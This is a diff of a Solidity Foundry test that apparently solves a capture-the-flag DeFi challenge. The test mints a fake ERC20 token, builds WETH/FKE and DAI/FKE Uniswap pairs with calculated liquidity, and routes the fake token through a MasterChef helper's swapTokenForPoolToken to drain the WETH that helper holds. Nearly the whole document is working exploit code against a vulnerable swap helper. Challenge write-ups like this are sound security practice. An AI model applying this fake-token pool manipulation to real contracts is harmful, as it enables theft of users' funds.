@@ -31,9 +31,55 @@ contract FakeERC20 is ERC20 {
 }
 
 interface IUniswapV2Pair {
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function name() external pure returns (string memory);
+    function symbol() external pure returns (string memory);
+    function decimals() external pure returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 value) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+
+    function DOMAIN_SEPARATOR() external view returns (bytes32);
+    function PERMIT_TYPEHASH() external pure returns (bytes32);
+    function nonces(address owner) external view returns (uint256);
+
+    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
+        external;
+
+    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
+    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
+    event Swap(
+        address indexed sender,
+        uint256 amount0In,
+        uint256 amount1In,
+        uint256 amount0Out,
+        uint256 amount1Out,
+        address indexed to
+    );
+    event Sync(uint112 reserve0, uint112 reserve1);
+
+    function MINIMUM_LIQUIDITY() external pure returns (uint256);
+    function factory() external view returns (address);
     function token0() external view returns (address);
     function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function price0CumulativeLast() external view returns (uint256);
+    function price1CumulativeLast() external view returns (uint256);
+    function kLast() external view returns (uint256);
+
+    function mint(address to) external returns (uint256 liquidity);
+    function burn(address to) external returns (uint256 amount0, uint256 amount1);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function skim(address to) external;
+    function sync() external;
+
+    function initialize(address, address) external;
 }
 
 interface IUniswapV2Factory {
@@ -60,13 +106,19 @@ contract ExploitRandom is Test {
     StdStorage _stdstore;
 
     Setup s;
+    IUniswapV2Factory factory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
+
     MasterChefHelper mcHelper;
     MasterChefLike masterchef;
     UniswapV2RouterLike router;
+
     WETH9 WETH;
-    IUniswapV2Pair daiWethLpTkn;
     ERC20Like DAI = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IUniswapV2Factory factory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
+
+    FakeERC20 FKE;
+    IUniswapV2Pair daiWethLpTkn;
+    IUniswapV2Pair wethFkeLpTkn;
+    IUniswapV2Pair daiFkeLpTkn;
 
     uint256 poolIdDaiWeth = 2;
 
@@ -95,6 +147,20 @@ contract ExploitRandom is Test {
         vm.label(address(masterchef), "masterchef");
         vm.label(address(router), "router");
         vm.label(address(daiWethLpTkn), "DAI_WETH_LP");
+
+        FKE = new FakeERC20("Fake Token", "FKE");
+        vm.label(address(FKE), "FKE");
+
+        wethFkeLpTkn = IUniswapV2Pair(factory.createPair(address(WETH), address(FKE)));
+        vm.label(address(wethFkeLpTkn), "WETH_FKE_LP");
+
+        daiFkeLpTkn = IUniswapV2Pair(factory.createPair(address(DAI), address(FKE)));
+        vm.label(address(daiFkeLpTkn), "DAI_FKE_LP");
+
+        FKE.approve(address(router), type(uint256).max);
+        FKE.approve(address(mcHelper), type(uint256).max);
+        DAI.approve(address(router), type(uint256).max);
+        WETH.approve(address(router), type(uint256).max);
     }
 
     function writeTokenBalance(address who, address token, uint256 amt) internal {
@@ -102,76 +168,111 @@ contract ExploitRandom is Test {
     }
 
     function test__exploit() public {
-        // Create FKE token
-        FakeERC20 FKE = new FakeERC20("Fake Token", "FKE");
-        vm.label(address(FKE), "FKE");
+        (uint256 daiReservesDaiWeth, uint256 wethReservesDaiWeth,) = daiWethLpTkn.getReserves();
 
-        // Create UniswapPairs
-        IUniswapV2Pair wethFkeLpTkn = IUniswapV2Pair(factory.createPair(address(WETH), address(FKE)));
-        vm.label(address(wethFkeLpTkn), "WETH_FKE_LP");
+        uint256 wethToLpInWethFkePool = 20e18;
+        uint256 fkeToLpInWethFkePool = 20e18;
 
-        IUniswapV2Pair daiFkeLpTkn = IUniswapV2Pair(factory.createPair(address(DAI), address(FKE)));
-        vm.label(address(daiFkeLpTkn), "DAI_FKE_LP");
+        uint256 wethOutOfWethFkePool = 1e18;
+        // amount on mcHelper
+        uint256 wethToLp = 10e18 + wethOutOfWethFkePool;
 
-        (uint256 wethAmountPerUnitDai, uint256 daiAmountPerUnitWeth) = logPair(daiWethLpTkn);
+        FKE.mint(address(this), fkeToLpInWethFkePool);
+        WETH.deposit{value: wethToLpInWethFkePool}();
 
-        FKE.mint(address(this), 2e18);
-        writeTokenBalance(address(this), address(DAI), 1e18);
-        WETH.deposit{value: 1e18}();
+        router.addLiquidity(
+            address(WETH),
+            address(FKE),
+            wethToLpInWethFkePool,
+            fkeToLpInWethFkePool,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
 
-        FKE.approve(address(router), type(uint256).max);
-        DAI.approve(address(router), type(uint256).max);
-        WETH.approve(address(router), type(uint256).max);
+        logUniswapPair(wethFkeLpTkn);
 
-        // add liquidity to WETH/FKE
-        router.addLiquidity(address(WETH), address(FKE), 1e18, 1e18, 0, 0, address(this), block.timestamp);
+        address[] memory path = new address[](2);
+        path[0] = address(FKE);
+        path[1] = address(WETH);
+        uint256 fkeIntoWethFkePool = router.getAmountsIn(wethOutOfWethFkePool, path)[0];
+        console2.log("amount FKE in   :: %s", fkeIntoWethFkePool);
+        console2.log("amount WETH Out :: %s", wethOutOfWethFkePool);
+        console2.log();
 
-        // add liquidity to USDC/FKE
-        router.addLiquidity(address(DAI), address(FKE), 1e18, 1e18, 0, 0, address(this), block.timestamp);
+        uint256 daiOutOfDaiFkePool = (wethToLp * daiReservesDaiWeth) / wethReservesDaiWeth;
 
-        logPair(wethFkeLpTkn);
-        logPair(daiFkeLpTkn);
+        uint256 daiToLpInDaiFkePool = daiOutOfDaiFkePool * 10;
+        uint256 fkeToLpInDaiFkePool = daiToLpInDaiFkePool * 100000000000000 / 1799163140847036493;
 
-        FKE.mint(address(this), 10e18);
-        FKE.approve(address(mcHelper), type(uint256).max);
+        FKE.mint(address(this), fkeToLpInDaiFkePool);
+        writeTokenBalance(address(this), address(DAI), daiToLpInDaiFkePool);
 
-        // logPair(wethFkeLpTkn);
-        // logPair(usdcFkeLpTkn);
-        // console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
-        // console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
-        // logPair(IUniswapV2Pair(address(daiWethLpTkn)));
+        router.addLiquidity(
+            address(DAI),
+            address(FKE),
+            daiToLpInDaiFkePool,
+            fkeToLpInDaiFkePool,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
 
-        mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), 1e18, 0);
+        logUniswapPair(daiFkeLpTkn);
 
-        // console2.log("###############################################");
-        // console2.log("###############################################");
-        // console2.log("###############################################");
-        // console2.log();
+        path[1] = address(DAI);
+        uint256 fkeIntoDaiFkePool = router.getAmountsIn(daiOutOfDaiFkePool, path)[0];
+        console2.log("amount FKE in  :: %s", fkeIntoDaiFkePool);
+        console2.log("amount DAI Out :: %s", daiOutOfDaiFkePool);
+        console2.log();
 
-        // logPair(wethFkeLpTkn);
-        // logPair(usdcFkeLpTkn);
-        // console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
-        // console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
-        // logPair(IUniswapV2Pair(address(daiWethLpTkn)));
+        assertEq(fkeIntoDaiFkePool, fkeIntoWethFkePool, "amounts should be the same");
+
+        logUniswapPair(daiWethLpTkn);
+        logUniswapPair(daiFkeLpTkn);
+        logUniswapPair(wethFkeLpTkn);
+        console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
+        console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
+
+        uint256 amountIn = fkeToLpInWethFkePool * 2;
+        FKE.mint(address(this), amountIn);
+        mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), amountIn, 0);
+
+        console2.log("###############################################");
+        console2.log("###############################################");
+        console2.log("###############################################");
+        console2.log();
+
+        logUniswapPair(daiWethLpTkn);
+        logUniswapPair(daiFkeLpTkn);
+        logUniswapPair(wethFkeLpTkn);
+        console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
+        console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
 
         assertTrue(s.isSolved());
     }
 
-    function logPair(IUniswapV2Pair pair) public view returns (uint256 quote0, uint256 quote1) {
+    function logUniswapPair(IUniswapV2Pair pair) public view {
         ERC20 t0 = ERC20(pair.token0());
         ERC20 t1 = ERC20(pair.token1());
         string memory s0 = t0.symbol();
         string memory s1 = t1.symbol();
-        (uint256 r0, uint256 r1,) = pair.getReserves();
 
-        quote0 = router.quote(1e18, r0, r1);
-        quote1 = router.quote(1e18, r1, r0);
+        (uint256 r0, uint256 r1,) = pair.getReserves();
+        uint256 p0 = router.quote(1e18, r1, r0);
+        uint256 p1 = router.quote(1e18, r0, r1);
+        uint256 k = pair.kLast();
 
         console2.log("## %s/%s LP Reserves ##", s0, s1);
-        console2.log("Token0 :: %s :: %s", s0, r0);
-        console2.log("Price0 :: %s %s/%s", quote0, s0, s1);
-        console2.log("Token1 :: %s :: %s", s1, r1);
-        console2.log("Price1 :: %s %s/%s", quote1, s1, s0);
+        console2.log("K        :: %s", k);
+        console2.log("Token0   :: %s", s0);
+        console2.log("Reserves :: %s", r0);
+        console2.log("Price    :: %s", p0);
+        console2.log("Token1   :: %s", s1);
+        console2.log("Reserves :: %s", r1);
+        console2.log("Price    :: %s", p1);
         console2.log();
     }
 }
